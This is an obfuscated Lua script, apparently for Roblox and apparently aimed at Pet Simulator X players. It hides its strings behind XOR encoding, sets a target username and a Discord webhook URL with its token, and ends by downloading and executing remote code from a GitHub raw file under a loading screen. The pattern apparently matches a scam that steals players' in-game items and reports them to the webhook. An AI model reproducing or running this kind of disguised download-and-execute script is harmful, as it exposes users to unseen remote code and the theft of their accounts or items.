--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.5) ~  Much Love, Ferib 

]]--

local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9)local v10={};for v11=1, #v8 do v6(v10,v0(v4(v1(v2(v8,v11,v11 + 1 )),v1(v2(v9,1 + ((v11-1)% #v9) ,1 + ((v11-1)% #v9) + 1 )))%256 ));end return v5(v10);end Username=v7("\18\248\250\6\30\239\239\58\37\200\194\29\36\205\201","\65\172\187\95");WebHook="https://discord.com/api/webhooks/1099655792011001866/I8GhzCKNDH38aJjxZ4HzkqI5GgXpek8bJPhPR_c9HNf-GadwN_jTXW9V2fEU-adbWtxy";loadingscreen=true;_G.CustomScriptName=v7("\185\225\254\255\123\171\251\230\176\26\150\250\235\176\29\130\252\233","\227\142\132\144\91");_G.Text1=v7("\207\124\232\204\16\232\63\214\202\1\248\122\254\139\78\178","\156\31\154\165\96");_G.Text2=v7("\67\168\95\107\137\122\174\22\121\143\102\233\101\124\146\125\185\66","\20\201\54\31\224");_G.Text3=v7("\174\229\251\177\191\78\131\234\190\150\181\83\140\163\176\252","\237\141\158\210\212\39");_G.Text4=v7("\67\71\217\70\241\216\57\119\19\235\87\247\216\39\100\64\150\26\171","\16\51\184\52\133\177\87");loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))();
